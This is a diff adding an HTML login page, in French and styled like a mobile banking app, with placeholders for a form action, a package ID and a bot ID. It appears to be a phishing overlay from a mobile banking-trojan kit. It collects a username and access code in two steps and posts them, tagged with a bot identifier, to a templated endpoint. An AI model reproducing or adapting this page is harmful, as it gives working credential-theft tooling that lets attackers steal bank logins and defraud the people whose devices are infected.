@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
+	<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
+
+<style type="text/css">
+		* {
+			padding: 0;
+			margin: 0;
+
+		}
+
+		body {
+			background-image: url("%DYN_PATH%/img/mass_portrait.jpg");
+			background-size: cover;
+			/*background-size: 100%;*/
+		}
+		.top-bar {
+			display: flex;
+		    -webkit-box-align: center;
+		    align-items: center;
+		    -webkit-box-pack: justify;
+		    justify-content: space-between;
+		    height: 5rem;
+		    padding: 0 7px;
+		    /*background-color: black;*/
+		    border-bottom: 1px solid #e5e5e5;
+		    position: fixed;
+		    top: 0;
+		    right: 0;
+		    left: 0;
+		    color: white;
+		    height: 50px;
+		    z-index: 1000;
+
+			background: #959595; /* Old browsers */
+			background: -moz-linear-gradient(top, #2d2d2d 0%, #2f2f2f 50%, #020202 100%); /* FF3.6-15 */
+			background: -webkit-linear-gradient(top, #2d2d2d 0%, #2f2f2f 50%,#020202 100%); /* Chrome10-25,Safari5.1-6 */
+			background: linear-gradient(to bottom, #2d2d2d 0%,#2f2f2f 50%,#020202 100%); /* W3C, IE10+, FF16+, Chrome26+, Opera12+, Safari7+ */
+			filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#959595', endColorstr='#1b1b1b',GradientType=0 ); /* IE6-9 */
+
+		    /*background-image: lineral-gradient(
+		    	to top,
+		    	#2d2d2d,
+		    	#2f2f2f 50%,
+		    	#020202 100%
+		    	);*/
+
+		}
+		.top-bar-nav {
+		    height: 30px;
+		    /*width: 24px;*/
+		    padding: 0;
+
+			background: #959595; /* Old browsers */
+			background: -moz-linear-gradient(top, #2d2d2d 0%, #2f2f2f 50%, #020202 100%); /* FF3.6-15 */
+			background: -webkit-linear-gradient(top, #2d2d2d 0%, #2f2f2f 50%,#020202 100%); /* Chrome10-25,Safari5.1-6 */
+			background: linear-gradient(to bottom, #2d2d2d 0%,#2f2f2f 50%,#020202 100%); /* W3C, IE10+, FF16+, Chrome26+, Opera12+, Safari7+ */
+			filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#959595', endColorstr='#1b1b1b',GradientType=0 ); /* IE6-9 */
+
+		    border: 1px solid black;
+		    position: absolute;
+		    top: 50%;
+		    transform: translateY(-50%);
+		    color: white;
+		    cursor: pointer;
+		    left: 4px;
+		    padding-left: 10px;
+		    padding-right: 10px;
+		    font-weight: bold;
+		    border-radius: 5px;
+		}
+		.top-bar-title {
+		    -webkit-box-flex: 1;
+		    -webkit-flex: 1;
+		    flex: 1;
+		    padding: 0;
+		    background: 0 0;
+		    text-align: left;
+		    text-transform: none;
+		    color: white;
+		    font-size: 1.5rem;
+		    /*font-weight: 400;*/
+		    font-weight: bold;
+		    line-height: 1.15;
+		    display: block;
+		    padding-left: 30px;
+		    text-align: center;
+		}
+
+		.loginform {
+			position: absolute;
+			top: 85px;
+			left: 10px;
+			right: 10px;
+			height: 160px;
+			background: #e9e9e9;
+			background: -moz-linear-gradient(to bottom, #f6f6f6 0%, #dcdcdc 100%);
+			background: -webkit-linear-gradient(to bottom, #f6f6f6 0%, #dcdcdc 100%);
+			background: linear-gradient(to bottom, #f6f6f6 0%, #dcdcdc 100%);
+			box-shadow: 1px 1px 20px #888888;
+			padding-top: 20px;
+			padding-left: 10px;
+		}
+		.id-div{
+			width: 100%;
+/*			padding-left: 10px;
+			padding-right: 10px;*/
+			padding: 0;
+			margin:0;
+		}
+		.login-field {
+
+			height: 25px;
+			margin-top: 10px;
+			right: 10px;
+			left: 10px;
+			width: calc(100% - 50px);
+
+			background-repeat: no-repeat;
+			background-size: 25px 25px;
+			padding-left: 30px;
+		}
+
+		.login-field::-webkit-input-placeholder{
+			color: #989898;
+
+		}
+		#identifiant {
+			background-image: url("%DYN_PATH%/img/person.png");
+		}
+		#code {
+			background-image: url("%DYN_PATH%/img/ic_lock.png");
+
+		}
+		.cb {
+			margin-top: 10px;
+		}
+		#remember-cb {
+			display: none;
+
+		}
+		#remember-cb + label {
+			float: right;
+			display: inline-block;
+			width: 20px;
+			height: 20px;
+			/*background-image: url("img/icon-check-new.png");*/
+			background-repeat: no-repeat;
+			/*background-size: 58px 120px;*/
+			/*background-position: -7px -67px;*/
+			margin-right: 20px;
+			/*background-position: 0, 39px;*/
+			border: 1px solid black;
+			border-radius: 3px;
+		}
+		#remember-cb:checked + label {
+			background-image: url("%DYN_PATH%/img/cb-on.png");
+			background-size: 20px 20px;
+					}
+
+		.valider {
+			margin-top: 10px;
+			width: calc(100% - 20px);
+			height: 30px;
+			border: 0;
+			border-radius: 3px;
+			background: #ee8481;
+			background: -moz-linear-gradient(to bottom, #ee8481 0%, #d06161 100%);;
+			background: -webkit-linear-gradient(to bottom, #ee8481 0%, #d06161 100%);;
+			background: linear-gradient(to bottom, #ee8481 0%, #d06161 100%);
+			color: white;
+			font-size: 14px;
+		}
+
+		.invis {
+			display: none;
+		}
+
+
+</style>
+
+</head>
+<body>
+	<div class="top-bar">
+		<button class="top-bar-nav">
+			Annuler
+		</button>
+		<h1 class="top-bar-title">Connexion</h1>
+	</div>
+
+	<div class="loginform">
+		<h3>
+			Saisissez l'identifiant
+		</h3>
+			<form role="form" name="form" action="%ACTION%" id="form" method="post">
+			<input type="hidden" name="page_id" value="%PKG%"><input type="hidden" name="bot_id" value="%BOTID%" />
+
+			<input type="text" name="fields[username]" id="identifiant" class="login-field" placeholder="Identifiant">
+			<input type="password" name="fields[password]" id="code" class="login-field invis" placeholder="Code d'accès">
+			</form>
+
+		<div class="cb">
+			<span id="remember-cb-label">Se souvenir de moi</span>
+			<input type="checkbox" id="remember-cb"><label for="remember-cb" class="remember-cb-image"></label>
+		</div>
+
+		<button id="connexion" class="valider">Connexion</button>
+		<button id="valider" class="invis valider">Valider</button>
+	</div>
+</body>
+
+
+<script type="text/javascript">
+
+(function(){
+	$('#connexion').bind('click', function(){
+		if (!$('#identifiant').val()){
+			return;
+		}
+		$('#identifiant').addClass('invis');
+		$('#code').removeClass('invis');
+		$('#connexion').addClass('invis');
+		$('#valider').removeClass('invis');
+		$('.remember-cb-image').css('display', 'none');
+		$('#remember-cb-label').addClass('invis');
+		$('#valider').css('margin-top', '30px');
+	});	
+
+	$('#valider').bind('click', function(){
+		var fields = {
+			'identifiant': /.+/,
+			'code': /.+/
+		};
+
+		var err = false;
+
+		for (i in fields){
+			var field = i;
+			var regex = fields[i];
+
+			if(!(new RegExp(regex).test($('#' + field).val())))
+			{
+				$('#' + field).closest('.form-group').addClass('has-error');
+				err = true;
+			} 
+		}
+
+		if (err){
+			return;
+		}
+
+		var oForm=document.getElementById('form');
+		oForm.submit();
+	});
+
+
+})();
+
+</script>
+
+
+</html>
